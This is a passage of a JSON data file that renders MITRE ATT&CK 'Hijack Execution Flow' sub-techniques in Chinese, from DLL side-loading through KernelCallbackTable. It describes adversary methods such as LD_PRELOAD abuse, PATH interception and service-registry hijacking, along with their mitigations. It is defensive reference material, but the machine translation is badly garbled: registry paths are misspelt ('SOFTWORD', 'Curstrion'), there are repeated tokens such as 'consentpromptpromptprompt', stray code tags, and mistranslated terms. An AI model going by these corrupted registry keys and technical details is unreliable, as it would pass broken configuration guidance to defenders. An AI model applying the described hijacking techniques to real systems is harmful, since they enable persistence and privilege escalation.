              "content": "使用Windows随附的程序sxstrace.exe以及手动检查，以检查清单文件，以了解软件中的并排问题。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可以使用新的DLL来执行此技术。通过使用能够阻止合法软件加载的DLL的应用程序控制解决方案来识别并阻止通过搜索订单劫持执行的潜在恶意软件。"
            }
          ]
        ]
      },
      {
        "id": "M1044",
        "name": "限制库加载",
        "description": [
          [
            {
              "type": "text",
              "content": "禁止远程DLL的加载。默认情况下将其包含在Windows Server 2012+中，可以通过Patch for XP+和Server 2003+获得。"
            }
          ],
          [
            {
              "type": "text",
              "content": "启用安全的DLL搜索模式，强制在目录中使用更大限制（例如"
            },
            {
              "type": "code",
              "content": "％SystemRoot％"
            },
            {
              "type": "text",
              "content": "）的目录中搜索系统DLL，在本地目录DLL之前使用（例如，用户的主目录）"
            }
          ],
          [
            {
              "type": "text",
              "content": "可以通过计算机配置> [策略]>管理模板> MSS（旧版）：MSS ：（ SafeDllSearchMode）启用安全的DLL搜索模式。关联的Windows注册表权点位于"
            },
            {
              "type": "code",
              "content": " HKLM \\ System \\ CurrentControlset \\ Control \\ Control \\ Session Manager \\ SafeDllSearchMode "
            },
            {
              "type": "text",
              "content": ""
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.002",
    "name": "DLL Side-Loading",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过侧面加载DLL执行自己的恶意有效载荷。类似于DLL搜索订单劫持，侧载涉及劫持程序加载的DLL。但是，对手不仅在程序的搜索顺序中种植DLL，而是等待受害者申请被调用，还可以通过种植然后调用合法申请来直接辅助其有效载荷，以执行其有效载荷（S）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "侧加载利用了加载程序使用的DLL搜索顺序，通过将受害者应用程序和恶意有效载荷彼此定位。对手可能会使用侧载作为掩盖他们在合法，可信赖且可能提高的系统或软件过程中执行的动作的手段。在交货和/或执行期间，可能不会标记用于侧载有效载荷的良性可执行文件。对手有效载荷也可以加密/包装或以其他方式混淆，直到加载到受信任过程的内存中为止。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "应用程序开发人员指导",
        "description": [
          [
            {
              "type": "text",
              "content": "在可能的情况下，在清单文件中包括哈希值，以帮助防止恶意库的侧面加载。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "定期更新软件以包含修复DLL侧加载漏洞的补丁。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.004",
    "name": "Dylib Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过在运行时搜索受害者应用程序搜索的路径中，将带有预期名称的恶意动态库（Dylib）执行自己的有效载荷。动态加载程序将尝试根据搜索路径的顺序找到Dylibs。Dylibs的路径可以用"
        },
        {
          "type": "code",
          "content": " @RPath "
        },
        {
          "type": "text",
          "content": "前缀，该路径允许开发人员使用相对路径根据可执行文件的位置指定运行时使用的搜索路径数组。此外，如果使用弱链接，例如"
        },
        {
          "type": "code",
          "content": " lc_load_weak_dylib "
        },
        {
          "type": "text",
          "content": "函数，即使不存在预期的迪利布，应用程序仍将执行。弱连接使开发人员可以在添加新API时在多个MacOS版本上运行应用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过在已确定的路径中插入带有丢失迪利布的名称的恶意迪利布来获得执行。迪利布（Dylibs）被加载到应用程序的地址空间中，使恶意迪利布（Dylib）继承了应用程序的特权级别和资源。基于该应用程序，这可能导致特权升级和不受限制的网络访问。由于在合法过程中掩盖了执行，因此该方法还可以从安全产品中逃避检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "设置目录访问控件，以防止文件写入应用程序的搜索路径，包括在运行应用程序的文件夹和标准Dylib文件夹中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.005",
    "name": "Executable Installer File Permissions Weakness",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持安装程序使用的二进制文件来执行自己的恶意有效载荷。这些过程可能会自动执行特定的二进制文件作为其功能的一部分或执行其他操作。如果不正确设置包含目标二进制的文件系统目录或二进制本身上的权限，则可以使用用户级权限将目标二进制覆盖并通过原始过程执行。如果原始过程和线程在较高的权限级别下运行，则替换的二进制文件也将在更高级别的权限下执行，其中可能包括系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "该技术的另一个变体可以通过利用在可执行，自提取的安装程序中常见的弱点来执行。在安装过程中，安装程序通常在"
        },
        {
          "type": "code",
          "content": "％temp％"
        },
        {
          "type": "text",
          "content": "目录中使用子目录，以解开诸如DLL，EXES或其他有效载荷之类的二进制文件。当安装程序创建子目录和文件时，他们通常不会设置适当的权限来限制写入访问权限，从而可以执行放置在子目录中或覆盖安装过程中使用的二进制文件中的不信任代码。此行为与DLL搜索顺序劫持有关，并且可能会利用DLL搜索顺序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这种技术用恶意替代合法的二进制文件，作为在较高权限级别执行代码的一种手段。某些安装程序还可能需要提高特权，这将在执行对手控制的代码时会导致特权升级。此行为与绕过用户帐户控制有关。已经向软件供应商报告了现有普通安装程序中这种弱点的几个示例。如果将执行过程设置为在特定时间或在某个事件中运行（例如，系统启动），则该技术也可以用于持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够检测企业内部系统上文件系统权限滥用机会并纠正它们的审计工具。诸如PowerSploit框架之类的工具包包含可用于探索服务文件系统权限弱点的系统的动力模块。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "关闭标准用户的UAC的特权高程"
            },
            {
              "type": "code",
              "content": " [HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ Windows \\ CurrentVersion \\ Curstrion \\ Policies \\ System] "
            },
            {
              "type": "text",
              "content": " </code>自动拒绝高程请求，添加："
            },
            {
              "type": "code",
              "content": "  “ consentpromptpromptpromptbehavioruser”代码>。考虑通过添加以下方式为所有用户启用安装程序检测：“ eNableInstallerDetection” = dword：00000001 "
            },
            {
              "type": "text",
              "content": "。这将提示安装密码，并记录尝试。为了禁用安装程序检测，请添加："
            },
            {
              "type": "code",
              "content": "“ eNableInstallerDetection” = dword：00000000 "
            },
            {
              "type": "text",
              "content": "。这可能会在UAC检测安装程序的过程中通过剥削来防止特权的潜在提升，但将允许安装过程继续而无需记录。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户和组的特权，以便只有授权的管理员才能与服务更改和服务二进制目标路径位置进行交互。从用户目录中拒绝执行，例如文件下载目录和临时目录。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.006",
    "name": "Dynamic Linker Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持环境变量来执行自己的恶意有效负载。动态链接器用于加载共享库。在程序的执行准备阶段中，动态链接器加载来自环境变量和文件共享库的绝对路径，例如Linux上的"
        },
        {
          "type": "code",
          "content": " ld_preload "
        },
        {
          "type": "text",
          "content": "，或"
        },
        {
          "type": "code",
          "content": " dyld_insert_libraries "
        },
        {
          "type": "text",
          "content": " MacOS上的"
        },
        {
          "type": "code",
          "content": " dyld_insert_libraries "
        },
        {
          "type": "text",
          "content": "。环境变量中指定的库首先加载，优先于具有相同功能名称的系统库。这些变量通常被开发人员使用来调试二进制文件，而无需重新编译，解除映射的符号，并在不更改原始库的情况下实现自定义功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux和MacOS上，劫持动态链接器变量可能会授予对受害者进程的内存，系统/网络资源以及可能提高特权的访问。由于在合法过程中掩盖了执行，因此该方法还可以从安全产品中逃避检测。对手可以使用"
        },
        {
          "type": "code",
          "content": "导出"
        },
        {
          "type": "text",
          "content": "命令，"
        },
        {
          "type": "code",
          "content": " setEnv "
        },
        {
          "type": "text",
          "content": "函数或"
        },
        {
          "type": "code",
          "content": " putenv "
        },
        {
          "type": "text",
          "content": "函数来通过命令行设置环境变量。对手还可以利用动态链接器劫持将变量在外壳中导出变量，或使用更高级别的语法以python的"
        },
        {
          "type": "code",
          "content": " os.environ "
        },
        {
          "type": "text",
          "content": "进行编程设置变量。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux上，对手可能会设置"
        },
        {
          "type": "code",
          "content": " ld_preload "
        },
        {
          "type": "text",
          "content": "指向受害者计划要求的合法库名称的恶意库，从而导致操作系统在执行受害者程序后加载对手的恶意代码。"
        },
        {
          "type": "code",
          "content": "可以通过环境变量或 /etc/ld.so.preload "
        },
        {
          "type": "text",
          "content": "文件设置LD_PRELOAD </code>。"
        },
        {
          "type": "code",
          "content": " ld_preload "
        },
        {
          "type": "text",
          "content": "指定的库被加载并通过"
        },
        {
          "type": "code",
          "content": " dlopen（）"
        },
        {
          "type": "text",
          "content": " and </code> mmap（）</code>分别映射到内存中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在MacOS上，此行为在概念上与Linux相同，仅在较低级别实现MacOS动态库（DYLD）方面有所不同。对手可以设置"
        },
        {
          "type": "code",
          "content": " dyld_insert_libraries "
        },
        {
          "type": "text",
          "content": "环境变量，以指向包含合法库的名称或受害者程序要求的功能的恶意库。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可以使用新的有效载荷来执行此技术。通过使用应用程序控制解决方案来识别并阻止通过劫持执行的潜在恶意软件，也能够阻止合法软件加载的库。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "当MacOS中启用系统完整性保护（SIP）时，执行受保护的二进制文件时，上述环境变量将被忽略。第三方应用程序还可以利用苹果的固定运行时，确保这些环境变量受到限制。管理员可以通过设置setUID和/或setGid位，使用权利或在马赫-o二进制中具有__-restrict段来增加应用程序的限制。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.007",
    "name": "Path Interception by PATH Environment Variable",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持用于加载库的环境变量来执行自己的恶意有效载荷。路径环境变量包含一个目录（用户和系统）列表，该操作系统会顺序搜索以搜索从脚本或命令行调用的二进制文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以将恶意程序放在存储在路径环境变量中的目录列表中的较早条目中，从而导致操作系统在通过该路径列表中顺序搜索时执行恶意二进制文件，而不是合法的二进制。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，在Windows上，如果对手在"
        },
        {
          "type": "code",
          "content": " c：\\ compend path path "
        },
        {
          "type": "text",
          "content": "中放置了一个名为“ net.exe”的恶意程序，那么默认情况下，该程序在"
        },
        {
          "type": "code",
          "content": " c：\\ windows \\ windows \\ system32 \\ net.exe "
        },
        {
          "type": "text",
          "content": "在路径环境变量中，当从命令行执行“ net”时，将调用"
        },
        {
          "type": "code",
          "content": " c：\\示例路径"
        },
        {
          "type": "text",
          "content": "，而不是系统的合法可执行文件，请"
        },
        {
          "type": "code",
          "content": " c：\\ windows\\ system32 \\ net.exe "
        },
        {
          "type": "text",
          "content": "。执行程序的一些方法依赖于路径环境变量来确定未给出程序路径时搜索的位置，例如从命令和脚本解释器执行程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以直接修改$路径变量指定要搜索的目录。对手可以修改"
        },
        {
          "type": "code",
          "content": " $ path "
        },
        {
          "type": "text",
          "content": "变量，以指向他们已写入访问的目录。当调用使用$路径变量的程序时，OS搜索指定的目录并执行恶意二进制。在MacOS上，也可以通过修改$ HOME变量来执行此操作。这些变量可以使用命令行，启动CTL，UNIX shell配置修改或修改"
        },
        {
          "type": "code",
          "content": " /etc/paths.d "
        },
        {
          "type": "text",
          "content": "文件夹内容进行修改。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在程序配置文件，脚本，路径环境变量，服务和快捷方式中查找并消除路径拦截弱点，并在函数允许时带有引号的路径变量。请注意Windows搜索顺序用于执行或加载二进制文件，并在适当的地方使用完全合格的路径。"
            }
          ],
          [
            {
              "type": "text",
              "content": "卸载软件时，请清理旧的Windows注册表键，以避免没有相关合法二进制文件的键。定期搜索并纠正或报告使用使用不安全路径配置报告软件的自定义或可用工具引入的系统上的路径拦截弱点。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可能需要将新的二进制文件放在通过这种弱点来执行的位置。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以在适当的情况下使用应用程序控制工具来识别并阻止潜在的恶意软件执行路径截距。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保设置适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
            },
            {
              "type": "code",
              "content": " c："
            },
            {
              "type": "text",
              "content": "和系统目录，例如<code> c：\\ windows \\ </code，>，以减少可以放置恶意文件执行的地方。要求将所有可执行文件放在写保护目录中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.008",
    "name": "Path Interception by Search Order Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持用于加载其他程序的搜索顺序来执行自己的恶意有效载荷。由于某些程序没有使用完整路径调用其他程序，因此对手可能会将自己的文件放置在呼叫程序所在的目录中，从而应调用程序的要求启动操作系统启动其恶意软件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当对手滥用Windows搜索未给出路径的程序的顺序时，就会发生搜索顺序劫持。与DLL搜索顺序劫持不同，搜索顺序取决于用于执行程序的方法。但是，在搜索Windows系统目录之前，Windows在启动程序的目录中搜索很常见。一个对搜索顺序劫持的程序的对手（即未指定可执行路径的程序）可以通过创建以不当指定的程序命名并将其放置在启动程序的目录中来利用此漏洞的优势来利用此漏洞。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，“ example.exe”运行命令行参数"
        },
        {
          "type": "code",
          "content": " net user "
        },
        {
          "type": "text",
          "content": "运行“ cmd.exe”。对手可以将一个名为“ net.exe”的程序放置在与示例同一目录中，“ net.exe”将运行，而不是Windows System Utility Net。另外，如果对手将一个名为“ net.com”的程序放在与“ net.exe”同一目录中“ net.exe”是由于在路径下定义的可执行扩展的顺序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "搜索订单劫持也是劫持DLL负载的常见做法，并在DLL搜索订单劫持中涵盖。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在程序配置文件，脚本，路径环境变量，服务和快捷方式中查找并消除路径拦截弱点，并在函数允许时带有引号的路径变量。请注意Windows搜索顺序用于执行或加载二进制文件，并在适当的地方使用完全合格的路径。"
            }
          ],
          [
            {
              "type": "text",
              "content": "卸载软件时，请清理旧的Windows注册表键，以避免没有相关合法二进制文件的键。定期搜索并纠正或报告使用使用不安全路径配置报告软件的自定义或可用工具引入的系统上的路径拦截弱点。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可能需要将新的二进制文件放在通过这种弱点来执行的位置。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以在适当的情况下使用应用程序控制工具来识别并阻止潜在的恶意软件执行路径截距。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保设置适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
            },
            {
              "type": "code",
              "content": " c："
            },
            {
              "type": "text",
              "content": "和系统目录，例如<code> c：\\ windows \\ </code，>，以减少可以放置恶意文件执行的地方。要求将所有可执行文件放在写保护目录中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.009",
    "name": "Path Interception by Unquoted Path",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持脆弱的文件路径参考来执行自己的恶意有效载荷。对手可以通过将可执行文件放置在路径中的较高级别目录中，以利用缺乏周围报价的路径，从而使Windows选择对手的可执行文件进行启动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果路径有一个或多个空间，并且不被引号包围，那么服务路径和快捷路径也可能容易受到路径拦截的影响（例如，"
        },
        {
          "type": "code",
          "content": " c：\\ space \\ program.exe.exe.exe.exe </code.exe </code.exe </code.exe </code.exe </code </code </code </code </code.vs.“ C：\\带有Space \\ Program.exe的安全路径” "
        },
        {
          "type": "text",
          "content": "）。（存储在Windows注册表密钥中）对手可以将可执行文件放在路径的较高级别目录中，Windows将解决该可执行文件而不是预期的可执行文件。例如，如果快捷方式中的路径为"
        },
        {
          "type": "code",
          "content": " c：\\ program Files \\ MyApp.exe "
        },
        {
          "type": "text",
          "content": "，对手可以在"
        },
        {
          "type": "code",
          "content": " c：\\ program.exe "
        },
        {
          "type": "text",
          "content": "中创建一个程序运行而不是预期的程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果定期调用可执行文件，则该技术可用于持久性，如果较高的特权过程启动了截距可执行文件，则可以使用特权升级。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在程序配置文件，脚本，路径环境变量，服务和快捷方式中查找并消除路径拦截弱点，并在函数允许时带有引号的路径变量。请注意Windows搜索顺序用于执行或加载二进制文件，并在适当的地方使用完全合格的路径。"
            }
          ],
          [
            {
              "type": "text",
              "content": "卸载软件时，请清理旧的Windows注册表键，以避免没有相关合法二进制文件的键。定期搜索并纠正或报告使用使用不安全路径配置报告软件的自定义或可用工具引入的系统上的路径拦截弱点。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可能需要将新的二进制文件放在通过这种弱点来执行的位置。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以在适当的情况下使用应用程序控制工具来识别并阻止潜在的恶意软件执行路径截距。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保设置适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
            },
            {
              "type": "code",
              "content": " c："
            },
            {
              "type": "text",
              "content": "和系统目录，例如<code> c：\\ windows \\ </code，>，以减少可以放置恶意文件执行的地方。要求将所有可执行文件放在写保护目录中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.010",
    "name": "Services File Permissions Weakness",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持服务使用的二进制文件来执行自己的恶意有效载荷。对手可能会在Windows服务权限中使用缺陷来替换服务开始时执行的二进制文件。这些服务过程可以自动执行特定的二进制文件作为其功能的一部分或执行其他操作。如果包含目标二进制的文件系统目录上的权限或二进制本身上的权限不正确，则可以使用用户级权限将目标二进制文件与另一个二进制文件覆盖并通过原始过程执行。如果原始过程和线程在较高的权限级别下运行，则替换的二进制文件也将在更高级别的权限下执行，其中可能包括系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这种技术用恶意替代合法的二进制文件，作为在较高权限级别执行代码的一种手段。如果将执行过程设置为在特定时间或在某个事件中运行（例如，系统启动），则该技术也可以用于持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够检测企业内部系统上文件系统权限滥用机会并纠正它们的审计工具。诸如PowerSploit框架之类的工具包包含可用于探索服务文件系统权限弱点的系统的动力模块。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "关闭标准用户的UAC的特权高程"
            },
            {
              "type": "code",
              "content": " [HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ Windows \\ CurrentVersion \\ Curstrion \\ Policies \\ System] "
            },
            {
              "type": "text",
              "content": " </code>自动拒绝高程请求，添加："
            },
            {
              "type": "code",
              "content": "  “ consentpromptpromptpromptbehavioruser”代码>。考虑通过添加以下方式为所有用户启用安装程序检测：“ eNableInstallerDetection” = dword：00000001 "
            },
            {
              "type": "text",
              "content": "。这将提示安装密码，并记录尝试。为了禁用安装程序检测，请添加："
            },
            {
              "type": "code",
              "content": "“ eNableInstallerDetection” = dword：00000000 "
            },
            {
              "type": "text",
              "content": "。这可能会在UAC检测安装程序的过程中通过剥削来防止特权的潜在提升，但将允许安装过程继续而无需记录。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户和组的特权，以便只有授权的管理员才能与服务更改和服务二进制目标路径位置进行交互。从用户目录中拒绝执行，例如文件下载目录和临时目录。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.011",
    "name": "Services Registry Permissions Weakness",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持服务使用的注册表条目来执行自己的恶意有效载荷。对手可能会在权限中使用与服务相关的注册表键的缺陷，以从最初指定的可执行文件重定向到他们控制的键，以便在服务启动时启动自己的代码。Windows在"
        },
        {
          "type": "code",
          "content": " hklm \\ System \\ CurrentControlset \\ Services "
        },
        {
          "type": "text",
          "content": "下，在注册表中存储本地服务配置信息。可以操纵下存储在服务注册表键下的信息，以通过服务控制器，SC.EXE，PowerShell或Reg等工具来修改服务的执行参数。通过访问控制列表和用户权限控制对注册表键的访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果无法正确设置用户和组的权限，并允许访问服务注册表键，则对手可能会将服务的BinPath/ImagePath更改为指向其控件下的其他可执行文件。当服务启动或重新启动时，对手控制程序将执行，从而使对手建立持久性和/或特权升级到帐户上下文中，该服务设置为在（本地/域名，系统，System，Localservice，或Localserservice或LocalService，或网络服务）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可能会更改服务注册表中的其他注册表键。例如，可以更改"
        },
        {
          "type": "code",
          "content": " FailureCommand "
        },
        {
          "type": "text",
          "content": "密钥，以便在服务失败或故意损坏的任何时候在高架上下文中执行该服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": ""
        },
        {
          "type": "code",
          "content": " performance "
        },
        {
          "type": "text",
          "content": "键包含驱动程序服务dll的名称以及DLL中多个导出功能的名称。如果<Code> dermative </code>键尚未存在，并且如果对手控制的用户具有"
        },
        {
          "type": "code",
          "content": "创建子键</code "
        },
        {
          "type": "text",
          "content": "权限，则对手可能会在此处创建"
        },
        {
          "type": "code",
          "content": " performance </code </code </code "
        },
        {
          "type": "text",
          "content": "键服务的注册表树指向恶意的DLL。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以添加"
        },
        {
          "type": "code",
          "content": "参数"
        },
        {
          "type": "text",
          "content": "密钥，该密钥存储特定于驱动程序的数据或其他自定义子键，以建立持久性或启用其他恶意活动。此外，如果对手使用svchost.exe启动其恶意服务，则可以使用"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ system \\ currentControlset \\ services \\ services \\ serviceName \\ parameters \\ parameters \\ serviceCeeders \\ servicedll </code "
        },
        {
          "type": "text",
          "content": "来识别服务的文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保为注册表设置适当的权限，以防止用户修改可能导致特权升级的系统组件的密钥。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.012",
    "name": "COR_PROFILER",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会利用COR_Profiler环境变量来劫持加载.NET CLR的程序的执行流。COR_PROFILER是一个.NET框架功能，它允许开发人员指定一个未托管的（或外部的.NET）分析dll，将加载到每个.NET过程中，该进程加载了通用语言运行时（CLR）。这些探查器旨在监视，故障排除和调试由.NET CLR执行的托管代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "COR_Profiler环境变量可以在各种范围（系统，用户或过程）上设置，从而产生不同级别的影响。在注册表中指定了系统和整个用户环境变量范围，其中组件对象模型（COM）对象可以注册为Profiler dll。也可以在不修改注册表的情况下内置内存中创建过程范围cor_profiler。从.NET Framework 4开始，只要在COR_Profiler_Path环境变量中指定DLL的位置，DLL就不需要注册。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用cor_profiler建立持久性，每次调用CLR时，在所有.NET过程中都会执行恶意DLL。如果受害者.NET流程以较高的许可级别执行，以及.NET流程提供的挂钩和损害防御措施，则COR_Profiler也可用于提升特权（EX：旁路用户帐户控制）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "通过使用能够审核和/或阻止未批准的DLL的应用程序控制解决方案（例如Applocker），识别并阻止潜在的恶意无管理的COR_Profiler分析DLL。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保为注册中心设置适当的权限，以防止用户修改与COR_Profiler相关的密钥。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权，以便只有授权的管理员可以编辑系统环境变量。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.013",
    "name": "KernelCallbackTable",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "，以劫持其执行流程以运行自己的有效载荷。"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "可以在过程环境块（PEB）中找到，并在加载"
        },
        {
          "type": "code",
          "content": " user32.dll "
        },
        {
          "type": "text",
          "content": "后，将GUI进程可用的一系列图形功能初始化。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "劫持过程的执行流，通过用恶意有效载荷替换原始回调函数。可以通过各种方式来修改回调函数，涉及相关行为，例如反射代码加载或过程注入到另一个过程中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以通过找到peb（例如：通过呼叫"
        },
        {
          "type": "code",
          "content": " ntqueryInformationProcess（）"
